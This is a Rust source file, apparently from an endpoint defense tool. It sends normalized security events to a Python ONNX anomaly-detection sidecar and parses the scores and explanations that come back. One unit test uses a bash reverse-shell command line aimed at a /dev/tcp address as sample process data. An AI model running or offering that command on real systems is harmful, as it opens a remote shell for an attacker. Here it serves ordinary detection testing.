use std::io::{BufRead, BufReader, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::Mutex;

use crate::events::NormalizedEvent;
use crate::ipc::AiEngineStatus;
use serde::{Deserialize, Serialize};
use tracing::{debug, error, info, warn};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AiScoreResult {
    pub score: f64,
    pub is_anomaly: bool,
    pub explanation: Option<AnomalyExplanation>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnomalyExplanation {
    pub anomaly_score: f64,
    pub is_anomaly: bool,
    pub summary: String,
    pub top_contributors: Vec<FeatureContribution>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FeatureContribution {
    pub feature: String,
    pub value: f64,
    pub baseline_mean: f64,
    pub baseline_std: f64,
    pub z_score: f64,
    pub contribution_pct: f64,
}

pub struct AiBridge {
    model_dir: PathBuf,
    python_bin: String,
    sidecar_script: Option<PathBuf>,
    sidecar: Mutex<Option<SidecarProcess>>,
    events_scored: u64,
    anomalies_detected: u64,
}

struct SidecarProcess {
    child: Child,
    stdin: std::process::ChildStdin,
    reader: BufReader<std::process::ChildStdout>,
}

impl AiBridge {
    pub fn new(model_dir: &Path) -> Self {
        let python_bin = find_python().unwrap_or_else(|| "python3".into());
        let sidecar_script = find_sidecar_script();
        Self {
            model_dir: model_dir.to_path_buf(),
            python_bin,
            sidecar_script,
            sidecar: Mutex::new(None),
            events_scored: 0,
            anomalies_detected: 0,
        }
    }

    pub fn record_score(&mut self, is_anomaly: bool) {
        self.events_scored += 1;
        if is_anomaly {
            self.anomalies_detected += 1;
        }
    }

    pub fn status(&self) -> AiEngineStatus {
        let model_path = self.find_onnx_model();
        let model_loaded = model_path.is_some();
        let available = model_loaded && self.python_available();
        let baseline_learned = model_loaded;
        let ollama_available = probe_ollama();

        let sidecar_running = self
            .sidecar
            .lock()
            .ok()
            .map(|s| s.is_some())
            .unwrap_or(false);

        AiEngineStatus {
            available: available || sidecar_running,
            model_loaded,
            model_path: model_path.map(|p| p.to_string_lossy().into_owned()),
            baseline_learned,
            events_scored: self.events_scored,
            anomalies_detected: self.anomalies_detected,
            last_drift_check: None,
            drift_detected: false,
            ollama_available,
        }
    }

    pub fn start_sidecar(&self) -> bool {
        let script = match &self.sidecar_script {
            Some(s) if s.exists() => s.clone(),
            _ => {
                debug!("sidecar script not found");
                return false;
            }
        };

        if !self.python_available() {
            debug!("python with onnxruntime not available");
            return false;
        }

        let model_dir_str = self.model_dir.to_string_lossy().to_string();

        match Command::new(&self.python_bin)
            .args(["-I", script.to_str().unwrap_or("sidecar.py"), &model_dir_str])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit())
            .spawn()
        {
            Ok(mut child) => {
                let stdin = child.stdin.take().expect("stdin piped");
                let stdout = child.stdout.take().expect("stdout piped");
                let reader = BufReader::new(stdout);

                let mut guard = self.sidecar.lock().unwrap();
                *guard = Some(SidecarProcess {
                    child,
                    stdin,
                    reader,
                });
                info!("AI sidecar started");

                // Verify with ping
                drop(guard);
                if let Some(resp) = self.send_command(r#"{"cmd":"ping"}"#)
                    && resp.contains("true")
                {
                    info!("AI sidecar handshake OK");
                    return true;
                }
                warn!("AI sidecar ping failed");
                self.stop_sidecar();
                false
            }
            Err(e) => {
                error!(%e, "failed to spawn AI sidecar");
                false
            }
        }
    }

    pub fn stop_sidecar(&self) {
        let mut guard = self.sidecar.lock().unwrap();
        if let Some(mut proc) = guard.take() {
            let _ = writeln!(proc.stdin, r#"{{"cmd":"shutdown"}}"#);
            let _ = proc.child.wait();
            info!("AI sidecar stopped");
        }
    }

    pub fn score_events(&mut self, events: &[NormalizedEvent]) -> Option<AiScoreResult> {
        if events.is_empty() {
            return None;
        }

        let event_dicts: Vec<serde_json::Value> = events
            .iter()
            .map(event_to_sidecar_dict)
            .collect();

        let request = serde_json::json!({
            "cmd": "score",
            "events": event_dicts,
        });

        let request_str = serde_json::to_string(&request).ok()?;
        let response = self.send_command(&request_str)?;

        match serde_json::from_str::<AiScoreResult>(&response) {
            Ok(result) => {
                self.events_scored += 1;
                if result.is_anomaly {
                    self.anomalies_detected += 1;
                }
                Some(result)
            }
            Err(e) => {
                debug!(%e, "failed to parse sidecar score response");
                None
            }
        }
    }

    pub fn sidecar_running(&self) -> bool {
        self.sidecar
            .lock()
            .ok()
            .map(|s| s.is_some())
            .unwrap_or(false)
    }

    fn send_command(&self, cmd: &str) -> Option<String> {
        let mut guard = self.sidecar.lock().ok()?;
        let proc = guard.as_mut()?;

        if writeln!(proc.stdin, "{}", cmd).is_err() {
            drop(guard);
            self.cleanup_dead_sidecar();
            return None;
        }
        if proc.stdin.flush().is_err() {
            drop(guard);
            self.cleanup_dead_sidecar();
            return None;
        }

        let mut line = String::new();
        match proc.reader.read_line(&mut line) {
            Ok(0) | Err(_) => {
                drop(guard);
                self.cleanup_dead_sidecar();
                None
            }
            Ok(_) => Some(line.trim().to_string()),
        }
    }

    fn cleanup_dead_sidecar(&self) {
        if let Ok(mut guard) = self.sidecar.lock()
            && let Some(mut proc) = guard.take()
        {
            let _ = proc.child.kill();
            let _ = proc.child.wait();
            warn!("cleaned up dead AI sidecar");
        }
    }

    fn find_onnx_model(&self) -> Option<PathBuf> {
        let candidates = [
            self.model_dir.join("anomaly_detector.onnx"),
            self.model_dir.join("model.onnx"),
        ];
        candidates.into_iter().find(|p| p.exists())
    }

    fn python_available(&self) -> bool {
        Command::new(&self.python_bin)
            .args(["-c", "import onnxruntime"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }
}

impl Drop for AiBridge {
    fn drop(&mut self) {
        self.stop_sidecar();
    }
}

fn event_to_sidecar_dict(event: &NormalizedEvent) -> serde_json::Value {
    let event_type = serde_json::to_value(event.event_type)
        .ok()
        .and_then(|v| v.as_str().map(String::from))
        .unwrap_or_default();

    let mut obj = serde_json::json!({
        "event_type": event_type,
        "timestamp": event.timestamp.to_rfc3339(),
        "severity": event.severity.to_string(),
    });

    if let Some(ref pc) = event.process_context {
        obj["process_context"] = serde_json::json!({
            "pid": pc.pid,
            "ppid": pc.ppid,
            "name": pc.name,
            "cmdline": pc.cmdline,
        });
    }

    if let Some(ref fc) = event.file_context {
        let action = serde_json::to_value(fc.action)
            .ok()
            .and_then(|v| v.as_str().map(String::from))
            .unwrap_or_default();
        obj["file_context"] = serde_json::json!({
            "path": fc.path,
            "action": action,
        });
    }

    if let Some(ref nc) = event.network_context {
        let direction = serde_json::to_value(nc.direction)
            .ok()
            .and_then(|v| v.as_str().map(String::from))
            .unwrap_or_default();
        obj["network_context"] = serde_json::json!({
            "remote_addr": nc.remote_addr,
            "remote_port": nc.remote_port,
            "direction": direction,
        });
    }

    if let Some(ref ac) = event.auth_context {
        let action = serde_json::to_value(ac.action)
            .ok()
            .and_then(|v| v.as_str().map(String::from))
            .unwrap_or_default();
        obj["auth_context"] = serde_json::json!({
            "action": action,
            "source_addr": ac.source_addr,
        });
    }

    obj
}

fn find_python() -> Option<String> {
    for bin in ["python3", "python"] {
        if Command::new(bin)
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
        {
            return Some(bin.into());
        }
    }
    None
}

fn find_sidecar_script() -> Option<PathBuf> {
    let candidates = [
        PathBuf::from("ai/sidecar.py"),
        PathBuf::from("/usr/share/os-defender/ai/sidecar.py"),
        PathBuf::from("/opt/os-defender/ai/sidecar.py"),
    ];

    // Also check relative to the executable
    if let Ok(exe) = std::env::current_exe()
        && let Some(dir) = exe.parent()
    {
        let beside_exe = dir.join("ai").join("sidecar.py");
        if beside_exe.exists() {
            return Some(beside_exe);
        }
        if let Some(parent) = dir.parent() {
            let dev_path = parent.join("ai").join("sidecar.py");
            if dev_path.exists() {
                return Some(dev_path);
            }
        }
    }

    candidates.into_iter().find(|p| p.exists())
}

fn probe_ollama() -> bool {
    use std::net::TcpStream;
    use std::time::Duration;

    match TcpStream::connect_timeout(
        &"127.0.0.1:11434".parse().unwrap(),
        Duration::from_millis(500),
    ) {
        Ok(_) => {
            debug!("Ollama API reachable on :11434");
            true
        }
        Err(_) => {
            debug!("Ollama not available");
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn status_without_model() {
        let dir = tempfile::tempdir().unwrap();
        let bridge = AiBridge::new(dir.path());
        let status = bridge.status();
        assert!(!status.model_loaded);
        assert_eq!(status.events_scored, 0);
    }

    #[test]
    fn status_with_model_file() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("anomaly_detector.onnx"), b"fake").unwrap();
        let bridge = AiBridge::new(dir.path());
        let status = bridge.status();
        assert!(status.model_loaded);
        assert_eq!(
            status.model_path.as_deref(),
            Some(dir.path().join("anomaly_detector.onnx").to_str().unwrap())
        );
    }

    #[test]
    fn record_scores() {
        let dir = tempfile::tempdir().unwrap();
        let mut bridge = AiBridge::new(dir.path());
        bridge.record_score(false);
        bridge.record_score(true);
        bridge.record_score(false);
        let status = bridge.status();
        assert_eq!(status.events_scored, 3);
        assert_eq!(status.anomalies_detected, 1);
    }

    #[test]
    fn find_python_exists() {
        let py = find_python();
        assert!(py.is_some(), "python3 or python should exist in test env");
    }

    #[test]
    fn event_to_dict_roundtrip() {
        use crate::events::{EventType, OsType, ProcessContext, Severity};

        let event = NormalizedEvent::new(
            "test-ep".into(),
            OsType::Linux,
            EventType::Process,
            Severity::High,
        )
        .with_process(ProcessContext {
            pid: 42,
            ppid: Some(1),
            name: "bash".into(),
            exe: None,
            cmdline: Some("bash -i >& /dev/tcp/10.0.0.1/4444".into()),
            uid: None,
            username: None,
            start_time: None,
            children_pids: vec![],
        });

        let dict = event_to_sidecar_dict(&event);
        assert_eq!(dict["event_type"], "process");
        assert_eq!(dict["process_context"]["pid"], 42);
        assert_eq!(dict["process_context"]["name"], "bash");
        assert!(dict["process_context"]["cmdline"]
            .as_str()
            .unwrap()
            .contains("/dev/tcp"));
    }

    #[test]
    fn sidecar_not_running_by_default() {
        let dir = tempfile::tempdir().unwrap();
        let bridge = AiBridge::new(dir.path());
        assert!(!bridge.sidecar_running());
    }

    #[test]
    fn score_returns_none_without_sidecar() {
        let dir = tempfile::tempdir().unwrap();
        let mut bridge = AiBridge::new(dir.path());
        let result = bridge.score_events(&[]);
        assert!(result.is_none());
    }

    #[test]
    fn ai_score_result_deserialize() {
        let json = r#"{"score": -0.15, "is_anomaly": true, "explanation": null}"#;
        let result: AiScoreResult = serde_json::from_str(json).unwrap();
        assert!(result.is_anomaly);
        assert!(result.score < 0.0);
        assert!(result.explanation.is_none());
    }

    #[test]
    fn ai_score_result_with_explanation() {
        let json = r#"{
            "score": -0.3,
            "is_anomaly": true,
            "explanation": {
                "anomaly_score": -0.3,
                "is_anomaly": true,
                "summary": "Anomalous: failed_login_rate is 5.2σ above baseline",
                "top_contributors": [
                    {"feature": "failed_login_rate", "value": 12.0, "baseline_mean": 1.5, "baseline_std": 2.0, "z_score": 5.25, "contribution_pct": 45.2}
                ]
            }
        }"#;
        let result: AiScoreResult = serde_json::from_str(json).unwrap();
        assert!(result.is_anomaly);
        let exp = result.explanation.unwrap();
        assert_eq!(exp.top_contributors.len(), 1);
        assert_eq!(exp.top_contributors[0].feature, "failed_login_rate");
    }
}
